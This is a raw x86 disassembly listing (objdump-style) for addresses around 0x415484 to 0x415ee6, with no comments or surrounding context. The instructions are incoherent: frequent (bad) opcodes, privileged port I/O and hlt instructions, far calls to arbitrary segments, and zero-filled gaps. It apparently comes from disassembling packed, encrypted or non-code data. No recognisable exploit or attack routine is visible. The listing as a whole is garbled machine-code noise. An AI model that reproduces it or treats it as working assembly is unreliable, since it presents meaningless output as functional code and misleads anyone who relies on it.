  415484:	gs jb  0x41545d
  415487:	mov    ss,WORD PTR [ebp+0x850d04a]
  41548d:	addr16 push ds
  41548f:	loope  0x415499
  415491:	int    0xf8
  415493:	xor    DWORD PTR ds:[ebx-0x32ffc8f1],0xe22cb4e3
  41549e:	dec    esp
  41549f:	cmp    edi,eax
  4154a1:	xor    dh,BYTE PTR [esp+esi*2-0x38f49314]
  4154a8:	nop
  4154a9:	xor    DWORD PTR [ecx],eax
  4154ab:	dec    ecx
  4154ac:	inc    edi
  4154ad:	push   ds
  4154ae:	cmp    BYTE PTR [esi-0x60],cl
  4154b1:	out    0x16,al
  4154b3:	sbb    DWORD PTR [esi-0x18],edi
  4154b6:	pop    ds
  4154b7:	add    DWORD PTR [edx+esi*8+0x78795348],0x3cb85873
  4154c2:	cmp    eax,0xf7477f7d
  4154c7:	call   0x970fde0
  4154cc:	mov    ebp,esi
  4154ce:	sub    eax,0x1e20d838
  4154d3:	call   0xc38c:0x56ec8b3f
  4154da:	scas   al,BYTE PTR es:[edi]
  4154db:	jne    0x4154b7
  4154dd:	fistp  DWORD PTR [ebx]
  4154df:	jbe    0x415509
  4154e1:	imul   ecx,DWORD PTR [edx-0x4e],0x8a76045c
  4154e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e9:	pop    esp
  4154ea:	dec    ecx
  4154eb:	hlt    
  4154ec:	(bad)  
  4154ee:	mov    eax,es:0x2e7fd18c
  4154f4:	nop
  4154f5:	lods   al,BYTE PTR ds:[esi]
  4154f6:	ret    
  4154f7:	(bad)  
  4154f8:	ret    0x3622
  4154fb:	mov    esp,0xf311a4f1
  415500:	ins    DWORD PTR es:[edi],dx
  415501:	xchg   BYTE PTR [esi-0x6d],bh
  415504:	xor    cl,ch
  415506:	fsub   DWORD PTR [ebx-0x1d]
  415509:	or     eax,0x250b0405
  41550e:	mov    ch,0x4e
  415510:	mov    al,ds:0xfff90a17
  415515:	cdq    
  415516:	xchg   ebx,eax
  415517:	pop    ecx
  415518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415519:	hlt    
  41551a:	rcl    BYTE PTR [eax+0x48],0x1e
  41551e:	test   BYTE PTR [esi+0x18],dh
  415521:	and    DWORD PTR [ebp+ebp*1+0x6c],esi
  415525:	das    
  415526:	jo     0x415594
  415528:	mov    ebx,0xaf5e8475
  41552d:	or     BYTE PTR [ebp+0x58],bh
  415530:	inc    edi
  415531:	push   esp
  415532:	stos   BYTE PTR es:[edi],al
  415533:	and    ebp,ebp
  415535:	jg     0x41550b
  415537:	fiadd  DWORD PTR [edx-0x3564e698]
  41553d:	dec    eax
  41553e:	mov    ch,0x62
  415540:	sti    
  415541:	mov    esp,0xc7a47847
  415546:	or     ebp,DWORD PTR [edi]
  415548:	jg     0x415527
  41554a:	xor    BYTE PTR [ebx],0x83
  41554d:	popa   
  41554e:	xlat   BYTE PTR ds:[ebx]
  41554f:	mov    ebx,0x9f011b7f
  415554:	mov    WORD PTR [edi*8+0x58fd18c5],cs
  41555b:	cmp    al,0xaf
  41555d:	jmp    0xdc48:0xf8cffe5f
  415564:	arpl   si,sp
  415566:	cdq    
  415567:	gs inc esp
  415569:	xor    DWORD PTR [esi+0xb09d52],esi
	...
  4155d3:	add    BYTE PTR [eax],al
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155d6
  4155e3:	div    edx
  4155e5:	push   ebp
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR [esi],bl
  4155ef:	fbstp  TBYTE PTR [ebp+0x5d]
  4155f2:	sub    al,0x29
  4155f4:	je     0x4155ae
  4155f6:	loopne 0x415616
  4155f8:	cmp    BYTE PTR [eax+0xc],ch
  4155fb:	hlt    
  4155fc:	retf   
  4155fd:	rol    DWORD PTR fs:[edi+0x4c1b7fd9],0x25
  415605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415606:	jb     0x415671
  415608:	jae    0x415651
  41560a:	add    BYTE PTR [edx+esi*4+0x3e],dl
  41560e:	xlat   BYTE PTR ds:[ebx]
  41560f:	sbb    eax,DWORD PTR [ecx+0x2ebc8535]
  415615:	push   DWORD PTR [edx-0x4602792]
  41561b:	loope  0x41559e
  41561d:	fadd   DWORD PTR [ecx]
  41561f:	loop   0x4155df
  415621:	inc    ebx
  415622:	sbb    BYTE PTR [ebx+0x6b],dl
  415625:	(bad)  
  415626:	out    dx,eax
  415627:	and    dh,0xfb
  41562a:	xchg   BYTE PTR [bp+si+0x77],cl
  41562e:	sbb    al,0xec
  415630:	das    
  415631:	inc    esi
  415632:	and    eax,0xe3567133
  415637:	cs mov dl,ch
  41563a:	and    esi,0x1e
  41563d:	and    BYTE PTR [edi-0xb2ff0e],bl
  415643:	(bad)  
  415644:	cmp    eax,DWORD PTR [ebx]
  415646:	dec    DWORD PTR [ebp-0x3c5e9b24]
  41564c:	jnp    0x41563a
  41564e:	in     eax,dx
  41564f:	dec    edx
  415650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415651:	addr16 inc ebx
  415653:	mov    ecx,0x36816a49
  415658:	sbb    bl,ch
  41565a:	sahf   
  41565b:	std    
  41565c:	mov    ds:0x6a7f4a07,eax
  415661:	sub    esp,DWORD PTR [ebx-0x6c9a5140]
  415667:	fnstsw WORD PTR [esi+0x72]
  41566a:	sbb    BYTE PTR [esi],dh
  41566c:	push   ebx
  41566d:	xor    BYTE PTR [eax+0x63],dl
  415670:	das    
  415671:	cmp    esp,edx
  415673:	out    dx,eax
  415674:	push   ss
  415675:	dec    edx
  415676:	out    dx,al
  415677:	xor    bl,BYTE PTR [ebx+eax*4]
  41567a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41567b:	les    esp,FWORD PTR [ebx+0x7f0b583b]
  415681:	sbb    dh,BYTE PTR [edi]
  415683:	mov    DWORD PTR [ebp-0x5bc73628],ecx
  415689:	fmul   QWORD PTR [esi+0x7c745d25]
  41568f:	jecxz  0x415642
  415691:	sub    bl,BYTE PTR [edx+edi*1+0x3a37ad77]
  415698:	shr    DWORD PTR [eax-0x64],1
  41569b:	mov    ecx,0x58921766
  4156a0:	es jne 0x41565b
  4156a3:	es dec esp
  4156a5:	mov    edi,0xc82b4d3c
  4156aa:	les    ebp,FWORD PTR [esi+0x4c90c389]
  4156b0:	xchg   edx,eax
  4156b1:	pusha  
  4156b2:	call   0x222a:0x9a412dec
  4156b9:	adc    esp,ebx
  4156bb:	xchg   ebx,eax
  4156bc:	push   eax
  4156bd:	addr16 sub eax,0x7029e664
  4156c3:	aam    0x9c
  4156c5:	adc    BYTE PTR [eax+ebx*8+0x74ad584a],dh
  4156cc:	sbb    cl,cl
  4156ce:	test   eax,0xecf04045
  4156d3:	shr    edx,0x42
  4156d6:	or     ebx,DWORD PTR [ebp+0x48]
  4156d9:	or     eax,0xd49af80c
  4156de:	jmp    0xa4de7e81
  4156e3:	arpl   bp,di
  4156e5:	js     0x41569f
  4156e7:	jle    0x415735
  4156e9:	or     bl,BYTE PTR [eax+edx*8-0x9]
  4156ed:	pop    es
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x80
  415763:	ds int3 
  415765:	or     al,0x67
  415767:	out    0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    ah,ch
  41576f:	adc    eax,0xae6b9ac0
  415774:	retf   
  415775:	cli    
  415776:	xor    BYTE PTR [esi+0x55c81807],bh
  41577c:	das    
  41577d:	push   cs
  41577e:	push   ecx
  41577f:	loop   0x4157b8
  415781:	pop    es
  415782:	ja     0x4157a3
  415784:	cmc    
  415785:	in     al,0x4c
  415787:	push   0x83c84c21
  41578c:	js     0x4157ba
  41578e:	sahf   
  41578f:	pusha  
  415790:	sbb    bh,al
  415792:	(bad)  
  415793:	sti    
  415794:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415796:	cmp    al,0xb
  415798:	and    eax,0x6d06e9dc
  41579d:	jnp    0x4157f3
  41579f:	dec    edi
  4157a0:	jmp    0x41581a
  4157a2:	add    eax,0xc4f990c8
  4157a7:	mov    ebx,0xfc600196
  4157ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157ad:	push   esi
  4157ae:	push   0x95279134
  4157b3:	cmp    dh,BYTE PTR [esi+0x64]
  4157b6:	pop    ss
  4157b7:	out    0xd4,al
  4157b9:	or     DWORD PTR [ecx+0x450377eb],edi
  4157bf:	push   ebp
  4157c0:	xor    al,0x3
  4157c2:	cwde   
  4157c3:	add    edi,ecx
  4157c5:	mov    ah,0xed
  4157c7:	xor    BYTE PTR [edx+0x271200e9],dh
  4157cd:	lea    esi,ds:0x38f2b638
  4157d3:	not    DWORD PTR [ebx]
  4157d5:	in     eax,0xa4
  4157d7:	pushf  
  4157d8:	repnz adc BYTE PTR [ecx-0x24],0x28
  4157dd:	and    cl,BYTE PTR [edi-0x4]
  4157e0:	xchg   DWORD PTR [ecx+0x49],esp
  4157e3:	push   cs
  4157e4:	push   es
  4157e5:	pop    esp
  4157e6:	(bad)  
  4157e7:	arpl   WORD PTR [edi+0x63e23758],dx
  4157ed:	xor    al,BYTE PTR [esi-0x44c5bf32]
  4157f3:	add    al,dl
  4157f5:	mov    ecx,0x2df68dc7
  4157fa:	push   0x45bb1e50
  4157ff:	rcl    esi,cl
  415801:	lahf   
  415802:	lahf   
  415803:	sbb    ah,bh
  415805:	push   eax
  415806:	(bad)  
  415807:	in     al,dx
  415808:	sbb    al,0x19
  41580a:	out    0x56,eax
  41580c:	not    DWORD PTR [edi+ebx*4+0x2d142ad4]
  415813:	add    eax,0x55940e78
  415818:	lods   eax,DWORD PTR ds:[esi]
  415819:	(bad)  
  41581a:	mov    ebp,0xa5d4bebc
  41581f:	(bad)  
  415821:	fisubr DWORD PTR [ecx+eax*2-0x1e]
  415825:	sbb    BYTE PTR [edi-0x26],cl
  415828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415829:	mov    edx,0xba13399c
  41582e:	inc    ebp
  41582f:	sub    eax,0xf1e6cb2a
  415834:	jne    0x41587b
  415836:	hlt    
  415837:	push   ecx
  415838:	loope  0x41588c
  41583a:	jp     0x4157ee
  41583c:	mov    bh,0x79
  41583e:	inc    esi
  41583f:	cwde   
  415840:	push   eax
  415841:	daa    
  415842:	es and esi,esi
  415845:	push   edx
  415846:	enter  0xf38e,0x3e
  41584a:	fnstcw WORD PTR [eax]
  41584c:	repnz pop ebx
  41584e:	in     ax,dx
  415850:	dec    ebx
  415851:	pop    edi
  415852:	ins    DWORD PTR es:[edi],dx
  415853:	xor    dh,bl
  415855:	sub    ebp,DWORD PTR [edi+0xa]
  415858:	(bad)  [eax]
  41585a:	sbb    DWORD PTR [edi-0x14],0xb
  41585e:	sbb    BYTE PTR [ecx],ah
  415860:	jno    0x415819
  415862:	add    al,0xc3
  415864:	jbe    0x41581d
  415866:	dec    ebx
  415867:	data16 mov WORD PTR ds:0x424a0cbb,gs
	...
  4158d6:	retf   
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	sar    DWORD PTR [edx],cl
  4158e3:	inc    dh
  4158e5:	packuswb mm5,mm0
  4158e8:	add    BYTE PTR [eax],al
  4158ea:	add    BYTE PTR [ecx],al
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	ficom  DWORD PTR [eax]
  4158f0:	daa    
  4158f1:	fld    DWORD PTR [esi+0x56]
  4158f4:	popa   
  4158f5:	mov    fs,WORD PTR [edi]
  4158f7:	dec    ebx
  4158f8:	(bad)  
  4158f9:	loop   0x41594b
  4158fb:	out    0xe7,eax
  4158fd:	inc    ebp
  4158fe:	jno    0x415915
  415900:	jne    0x415955
  415902:	daa    
  415903:	pop    ds
  415904:	push   ebx
  415905:	fdiv   QWORD PTR [ebx+0x5a]
  415908:	fucompp 
  41590a:	fadd   DWORD PTR [eax-0x47]
  41590d:	addr16 repnz retf 0x5558
  415912:	call   0x77c4201b
  415917:	popa   
  415918:	ins    BYTE PTR es:[edi],dx
  415919:	pop    edi
  41591a:	sbb    esp,ebp
  41591c:	fdivr  st,st(2)
  41591e:	int3   
  41591f:	cmp    eax,0x274162f6
  415924:	xchg   DWORD PTR [ebx+ecx*8],edi
  415927:	in     al,dx
  415928:	xchg   DWORD PTR [ebp-0x616eb2fb],ebx
  41592e:	shl    BYTE PTR [edi],cl
  415930:	mov    al,0x5
  415932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415933:	fs push eax
  415935:	ret    0xf20b
  415938:	cmp    BYTE PTR [eax+eax*8],dl
  41593b:	or     BYTE PTR [edx-0x1b],dh
  41593e:	mov    gs,WORD PTR [eax-0x15]
  415941:	test   DWORD PTR ds:0x109f3c9b,esp
  415947:	in     eax,0x5c
  415949:	push   eax
  41594a:	mov    bh,0x83
  41594c:	jae    0x41594e
  41594e:	jae    0x4159a3
  415950:	add    DWORD PTR [ebp+eax*8-0x24],ecx
  415954:	rcr    bh,1
  415956:	sub    eax,0xae523c35
  41595b:	in     eax,dx
  41595c:	jmp    0x415953
  41595e:	test   dl,ch
  415960:	scas   al,BYTE PTR es:[edi]
  415961:	mov    dx,0x78f9
  415965:	loopne 0x4159cd
  415967:	or     al,0xb7
  415969:	dec    esi
  41596a:	les    esi,FWORD PTR [esi+0x41]
  41596d:	xchg   BYTE PTR [edi+0x7221eca1],dl
  415973:	mov    ebx,0x527564ca
  415978:	mov    edi,0xc8d6db62
  41597d:	mov    DWORD PTR [ebx-0x712a7123],ebx
  415983:	lods   eax,DWORD PTR ds:[esi]
  415984:	sbb    eax,0xdfa6b504
  415989:	aam    0xd5
  41598b:	cwde   
  41598c:	mov    bl,0xbf
  41598e:	pop    ss
  41598f:	mov    ebx,edi
  415991:	cmp    eax,0xd2b8971f
  415996:	mov    edx,0x8a7d5395
  41599b:	mov    dh,0x25
  41599d:	ret    
  41599e:	or     DWORD PTR [ebp+0x6f529f6c],0x7e8c2dfb
  4159a8:	arpl   WORD PTR [edx+0x57],ax
  4159ab:	cmp    BYTE PTR [ebx-0x41],bh
  4159ae:	ds dec edi
  4159b0:	aam    0x60
  4159b2:	xor    BYTE PTR [edi-0x5ffecb94],ah
  4159b8:	aaa    
  4159b9:	push   edx
  4159ba:	popa   
  4159bb:	pop    ebx
  4159bc:	push   0xffffff8f
  4159be:	ss push ecx
  4159c0:	daa    
  4159c1:	es jne 0x4159c1
  4159c4:	sar    eax,0x3d
  4159c7:	xchg   esi,eax
  4159c8:	(bad)  
  4159c9:	stos   BYTE PTR es:[edi],al
  4159ca:	xchg   ebx,eax
  4159cb:	adc    DWORD PTR [ebp+0x7d],eax
  4159ce:	pop    esi
  4159cf:	sbb    esi,DWORD PTR [edi-0x222ed476]
  4159d5:	mov    cl,0xb9
  4159d7:	dec    edi
  4159d8:	cwde   
  4159d9:	jae    0x41599d
  4159db:	mov    ch,0x41
  4159dd:	add    DWORD PTR [esi+0x7bf5fc44],eax
  4159e3:	fadd   QWORD PTR [esi-0x4416052f]
  4159e9:	les    ecx,FWORD PTR [ecx]
  4159eb:	cwde   
  4159ec:	add    DWORD PTR [esi+0x0],esp
	...
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	jne    0x415ac1
  415a64:	test   DWORD PTR [edi+0x67],0xe9
  415a6b:	add    DWORD PTR [eax],eax
  415a6d:	add    BYTE PTR ds:0x8f6c7208,al
  415a73:	hlt    
  415a74:	das    
  415a75:	xchg   esi,eax
  415a76:	xchg   esp,eax
  415a77:	sbb    eax,0xd4924e5b
  415a7c:	jl     0x415a5d
  415a7e:	fiadd  DWORD PTR [ecx+0xe86330]
  415a84:	mov    edx,0xe586a966
  415a89:	xchg   BYTE PTR [ebx],cl
  415a8b:	retf   
  415a8c:	jae    0x415ab1
  415a8e:	test   BYTE PTR [edx],bl
  415a90:	sbb    BYTE PTR [ecx+0x2],dh
  415a93:	cmp    edi,edx
  415a95:	xlat   BYTE PTR ds:[ebx]
  415a96:	sbb    cl,BYTE PTR [ebx+0x68170748]
  415a9c:	test   edx,edx
  415a9e:	pushf  
  415a9f:	mov    cs,esp
  415aa1:	sub    eax,0x2f3517cc
  415aa6:	dec    esi
  415aa7:	cmp    dh,BYTE PTR [edi+eiz*2-0x49]
  415aab:	jae    0x415a8e
  415aad:	pop    ecx
  415aae:	mov    dl,ch
  415ab0:	leave  
  415ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab2:	je     0x415b2c
  415ab4:	fiadd  DWORD PTR [eax]
  415ab6:	popa   
  415ab7:	aas    
  415ab8:	outs   dx,DWORD PTR ds:[esi]
  415ab9:	(bad)  
  415abd:	aaa    
  415abe:	fidivr DWORD PTR [ebp+0x74b22e45]
  415ac4:	(bad)  
  415ac5:	xor    dh,BYTE PTR [esi+0x25f223d7]
  415acb:	loop   0x415af9
  415acd:	xchg   BYTE PTR [edi-0x77],dh
  415ad0:	dec    esp
  415ad1:	jo     0x415af7
  415ad3:	mov    ch,0x3d
  415ad5:	push   ebx
  415ad6:	xchg   edi,eax
  415ad7:	out    0x2f,eax
  415ad9:	out    dx,al
  415ada:	pushf  
  415adb:	popa   
  415adc:	dec    edx
  415add:	sbb    al,0xad
  415adf:	mov    dl,0x96
  415ae1:	pop    esp
  415ae2:	sti    
  415ae3:	(bad)  
  415ae4:	int    0x56
  415ae6:	outs   dx,BYTE PTR ds:[esi]
  415ae7:	fadd   QWORD PTR [esp+esi*1-0x4c]
  415aeb:	jb     0x415a8b
  415aed:	or     DWORD PTR [edx+0x14],esi
  415af0:	lahf   
  415af1:	mov    bl,0x63
  415af3:	cmc    
  415af4:	ficom  DWORD PTR [esi+ebp*4+0x78109e20]
  415afb:	outs   dx,BYTE PTR ds:[esi]
  415afc:	add    ah,BYTE PTR [ebx+0x2a]
  415aff:	add    eax,0x185d0431
  415b04:	inc    BYTE PTR [esi+0x5e]
  415b07:	out    0xc1,al
  415b09:	es fwait
  415b0b:	jno    0x415b84
  415b0d:	sbb    DWORD PTR [ecx-0x41c244a1],eax
  415b13:	sahf   
  415b14:	out    0x29,al
  415b16:	dec    ebx
  415b17:	dec    ebp
  415b18:	sub    BYTE PTR [esi],dl
  415b1a:	mov    cl,0x5e
  415b1c:	fnstcw WORD PTR [ebx+eiz*8-0x5c]
  415b20:	int    0x53
  415b22:	ret    0x1d50
  415b25:	mov    al,0x26
  415b27:	jne    0x415b25
  415b29:	push   edi
  415b2a:	ss mov cl,0x4d
  415b2d:	stos   BYTE PTR es:[edi],al
  415b2e:	das    
  415b2f:	mov    al,ds:0x798a8f67
  415b34:	fwait
  415b35:	cld    
  415b36:	jg     0x415b3a
  415b38:	out    dx,eax
  415b39:	bound  edx,QWORD PTR [eax]
  415b3b:	cmp    bh,BYTE PTR ds:0xb8377421
  415b41:	xor    bh,ch
  415b43:	push   ecx
  415b44:	int3   
  415b45:	fistp  DWORD PTR [edx-0x31]
  415b48:	mov    ebx,0x97f5eedb
  415b4d:	inc    eax
  415b4e:	jmp    0x415b6e
  415b50:	retf   
  415b51:	sub    al,0xcc
  415b53:	adc    BYTE PTR [esi+ebx*4],bh
  415b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b57:	mov    ecx,0xd0a9b6af
  415b5c:	ds sar ch,0xff
  415b60:	call   0x489a6c72
  415b65:	(bad)  
  415b66:	push   esp
  415b67:	pop    edx
  415b68:	jecxz  0x415b05
  415b6a:	ins    BYTE PTR es:[edi],dx
  415b6b:	pop    esi
  415b6c:	adc    BYTE PTR [eax+0x0],ah
	...
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdivr  st(5),st
  415be3:	(bad)  
  415be4:	cwde   
  415be5:	loope  0x415c4e
  415be7:	jmp    0x0:0x1000000
  415bee:	test   BYTE PTR [esi+edi*1],al
  415bf1:	ins    DWORD PTR es:[edi],dx
  415bf2:	dec    esi
  415bf3:	mov    WORD PTR [edi-0x1b],?
  415bf6:	add    BYTE PTR [esi-0x567f6300],0xda
  415bfd:	jl     0x415ba0
  415bff:	es sbb al,0x59
  415c02:	popa   
  415c03:	rcr    BYTE PTR [esi+0x16eeceb8],cl
  415c09:	or     BYTE PTR [edi],al
  415c0b:	sub    ebp,DWORD PTR [ebx-0x54]
  415c0e:	mov    bl,0xb4
  415c10:	cmc    
  415c11:	das    
  415c12:	jns    0x415bc9
  415c14:	scas   eax,DWORD PTR es:[edi]
  415c15:	xchg   edi,eax
  415c16:	xchg   ebx,eax
  415c17:	cmp    ah,dl
  415c19:	mov    eax,ds:0x4c9b2e39
  415c1e:	jne    0x415c73
  415c20:	iret   
  415c21:	push   edx
  415c22:	cmp    ch,BYTE PTR [eax-0x5f]
  415c25:	push   ds
  415c26:	fcom   st(6)
  415c28:	pushf  
  415c29:	jo     0x415c62
  415c2b:	and    BYTE PTR ds:[ebp+ebp*2-0x39],0x9c
  415c31:	pusha  
  415c32:	ret    
  415c33:	xchg   ebp,eax
  415c34:	mov    cl,0x57
  415c36:	cdq    
  415c37:	add    eax,0xf29d2ebd
  415c3c:	test   edi,edx
  415c3e:	loope  0x415bc8
  415c40:	mov    al,0x33
  415c42:	sbb    al,0x5
  415c44:	in     eax,dx
  415c45:	(bad)  
  415c46:	push   ecx
  415c47:	icebp  
  415c48:	in     eax,0x5e
  415c4a:	mov    ds:0x23074482,al
  415c4f:	push   edx
  415c50:	xchg   esi,eax
  415c51:	(bad)  
  415c52:	xor    al,bl
  415c54:	sbb    ah,BYTE PTR [eax-0x7f]
  415c57:	inc    eax
  415c58:	add    eax,0x30cb7a01
  415c5d:	sbb    bl,cl
  415c5f:	xchg   DWORD PTR [edi],esp
  415c61:	push   ebp
  415c62:	cdq    
  415c63:	cmp    ebx,DWORD PTR [ecx+0x78]
  415c66:	pop    esp
  415c67:	not    DWORD PTR [esi+0x36]
  415c6a:	call   0xb7cd0c75
  415c6f:	mov    ss,WORD PTR [ecx-0x627b3960]
  415c75:	or     al,0x2
  415c77:	jnp    0x415c57
  415c79:	and    al,0xf0
  415c7b:	push   edx
  415c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c7d:	pop    edx
  415c7e:	push   esi
  415c7f:	dec    eax
  415c80:	dec    edi
  415c81:	push   ecx
  415c82:	mov    esi,0xf48455bd
  415c87:	mov    al,ds:0x957307bf
  415c8c:	std    
  415c8d:	or     eax,0x46
  415c90:	or     al,0x2b
  415c92:	outs   dx,BYTE PTR ds:[esi]
  415c93:	hlt    
  415c94:	dec    ebx
  415c95:	retf   
  415c96:	sbb    dh,BYTE PTR [ebx+0x71]
  415c99:	int3   
  415c9a:	test   ch,cl
  415c9c:	in     al,dx
  415c9d:	cdq    
  415c9e:	cmp    BYTE PTR [ebx-0x35452c70],al
  415ca4:	sbb    bl,BYTE PTR [esi]
  415ca6:	hlt    
  415ca7:	sbb    BYTE PTR [edx-0x9210b58],al
  415cad:	jb     0x415cf7
  415caf:	cmp    esp,DWORD PTR [eax-0x5bdcc019]
  415cb5:	xor    BYTE PTR [edi+0x47090a0c],bl
  415cbb:	and    bl,BYTE PTR [edi-0x10]
  415cbe:	fs xchg edi,eax
  415cc0:	jmp    0x415c7f
  415cc2:	shr    bh,cl
  415cc4:	nop
  415cc5:	xor    BYTE PTR [ebx],0xd2
  415cc8:	push   cs
  415cc9:	test   dh,ah
  415ccb:	jb     0x415ccd
  415ccd:	mov    edi,0xf2c0b2e0
  415cd2:	push   edi
  415cd3:	ja     0x415d4b
  415cd5:	std    
  415cd6:	inc    ebp
  415cd7:	data16 aaa 
  415cd9:	cmp    al,0x7c
  415cdb:	jg     0x415d24
  415cdd:	push   ebx
  415cde:	mov    al,0xcb
  415ce0:	fs (bad) 
  415ce2:	popa   
  415ce3:	leave  
  415ce4:	out    0xc4,al
  415ce6:	push   ss
  415ce7:	dec    ecx
  415ce8:	popf   
  415ce9:	cmp    BYTE PTR [esp+edx*8],bl
  415cec:	shl    BYTE PTR [ebp+0x0],cl
	...
  415d53:	add    BYTE PTR [eax],al
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x8b6fa91f
  415d65:	jl     0x415dce
  415d67:	jmp    0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [edx-0x1e],cl
  415d70:	adc    BYTE PTR [edi],0x31
  415d73:	(bad)  [eax]
  415d75:	xchg   ebp,eax
  415d76:	inc    ebx
  415d77:	and    edx,DWORD PTR [ecx+0x4af8c02d]
  415d7d:	in     eax,dx
  415d7e:	pop    ebx
  415d7f:	popa   
  415d80:	sahf   
  415d81:	and    DWORD PTR [edi+0x5a],eax
  415d84:	or     cl,BYTE PTR [ebx-0x7f]
  415d87:	inc    eax
  415d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d89:	scas   al,BYTE PTR es:[edi]
  415d8a:	mov    edx,0xa6291907
  415d8f:	lods   al,BYTE PTR ds:[esi]
  415d90:	clc    
  415d91:	add    BYTE PTR [ecx+edi*1+0x77097a37],bl
  415d98:	das    
  415d99:	sub    BYTE PTR [esp+ebx*2],0xc7
  415d9d:	mov    esi,0x836f2e0
  415da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da3:	and    al,0x85
  415da5:	aam    0x1c
  415da7:	arpl   WORD PTR [ebx-0x1a],sp
  415daa:	xchg   BYTE PTR [ebx],bh
  415dac:	dec    esp
  415dad:	mov    esp,0xfbbe0274
  415db2:	inc    esi
  415db3:	and    ah,BYTE PTR [ebx]
  415db5:	call   0x30108d44
  415dba:	and    eax,0xa0cbdecc
  415dbf:	dec    ecx
  415dc0:	and    ecx,esi
  415dc2:	in     al,0xa7
  415dc4:	push   cs
  415dc5:	sub    al,0xfe
  415dc7:	mul    DWORD PTR [eax+0x2ea93622]
  415dcd:	jns    0x415dfd
  415dcf:	xor    al,0x2e
  415dd1:	jl     0x415e2d
  415dd3:	ins    BYTE PTR es:[edi],dx
  415dd4:	aas    
  415dd5:	mov    ch,0x9c
  415dd7:	data16 jo 0x415d5e
  415dda:	out    0x8c,eax
  415ddc:	inc    ebp
  415ddd:	add    eax,0x46fb3c90
  415de2:	pushf  
  415de3:	retf   
  415de4:	jnp    0x415de1
  415de6:	pop    esi
  415de7:	mov    ah,0xb9
  415de9:	mov    al,ds:0xad960489
  415dee:	mov    ?,esp
  415df0:	sar    BYTE PTR [edx-0x7eb64b8a],0x77
  415df7:	mov    bl,0xcb
  415df9:	push   0x93159bb0
  415dfe:	scas   al,BYTE PTR es:[edi]
  415dff:	jns    0x415dd3
  415e01:	mov    eax,ds:0x595be81e
  415e06:	cli    
  415e07:	and    al,ch
  415e09:	add    esi,DWORD PTR [edi+0x6a668548]
  415e0f:	sub    DWORD PTR [ebx-0x3fde17e2],esi
  415e15:	sbb    BYTE PTR [ebx+edi*8],0xde
  415e19:	lods   al,BYTE PTR ds:[esi]
  415e1a:	and    al,BYTE PTR [edx+ecx*8]
  415e1d:	mov    bh,0xbc
  415e1f:	inc    eax
  415e20:	adc    al,0x60
  415e22:	jecxz  0x415e1f
  415e24:	(bad)  
  415e25:	pop    ebx
  415e26:	mov    esi,0x45016326
  415e2b:	jnp    0x415e6f
  415e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e2e:	and    eax,ebp
  415e30:	inc    eax
  415e31:	and    DWORD PTR [esi+0x3d],edi
  415e34:	sti    
  415e35:	mov    dh,0x50
  415e37:	pop    edx
  415e38:	xchg   DWORD PTR [ecx+0x472aea6c],esi
  415e3e:	inc    esi
  415e3f:	mov    bl,0x8f
  415e41:	or     edx,DWORD PTR [esi-0x3742be14]
  415e47:	and    al,bl
  415e49:	ficom  DWORD PTR [ebp-0x77699528]
  415e4f:	pop    ecx
  415e50:	aas    
  415e51:	pusha  
  415e52:	sub    ah,al
  415e54:	or     ecx,ecx
  415e56:	dec    ebp
  415e57:	loope  0x415ead
  415e59:	popa   
  415e5a:	sbb    bh,BYTE PTR [edx+0x33]
  415e5d:	inc    edi
  415e5e:	and    BYTE PTR [ebx-0x54],al
  415e61:	into   
  415e62:	xchg   edx,eax
  415e63:	sbb    esp,edx
  415e65:	shr    ecx,1
  415e67:	aaa    
  415e68:	sbb    bh,BYTE PTR [edi+0x1be8b169]
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x0]
  415ee3:	pop    ds
  415ee4:	ror    dh,cl
  415ee6:	addr16 in al,dx
